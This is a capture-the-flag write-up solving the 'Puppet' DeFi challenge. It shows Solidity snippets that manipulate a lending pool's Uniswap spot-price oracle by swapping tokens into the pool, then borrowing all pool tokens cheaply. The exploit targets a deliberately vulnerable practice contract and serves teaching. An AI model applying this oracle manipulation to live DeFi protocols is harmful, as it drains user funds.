# Solving "The Puppet" 🕵️‍♂️

This challenge was pretty straightforward once I figured out the core issue: **price manipulation**.

## The Problem

The key insight was understanding how the collateral calculation works. The amount of ETH needed to borrow tokens depends on the token price, which comes from the ETH/token ratio in the Uniswap pool.

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

## The Solution

To get a really low token price, I needed to drain ETH from the pool and add more tokens to it. The `UniswapV1Exchange` contract has exactly what I needed: `tokenToEthSwapOutput`.

First, I checked how much ETH I could get for my tokens:

```solidity
uint256 ethReceived = i_exchange.getTokenToEthInputPrice(tokenBalance);
```

Then I swapped all my tokens for ETH:

```solidity
i_exchange.tokenToEthSwapOutput(ethReceived, tokenBalance, block.timestamp);
```

After manipulating the price, I only needed about `20 ETH` to borrow all the tokens in the pool:

```solidity
uint256 tokensInPool = i_token.balanceOf(address(i_pool));
bytes memory data = abi.encodeCall(i_pool.borrow, (tokensInPool, i_recovery));
(bool success,) = address(i_pool).call{value: address(this).balance}(data);
```

## Quick Tips

- Don't overthink the private key usage - it's provided for what reason, I don't know
- In Foundry, only contract deployments increase the nonce, so don't stress about keeping everything in one transaction
- I spent way too much time trying to make it all happen in a single call, but it's not necessary unless you want to overcomplicate things with forwarder contracts.
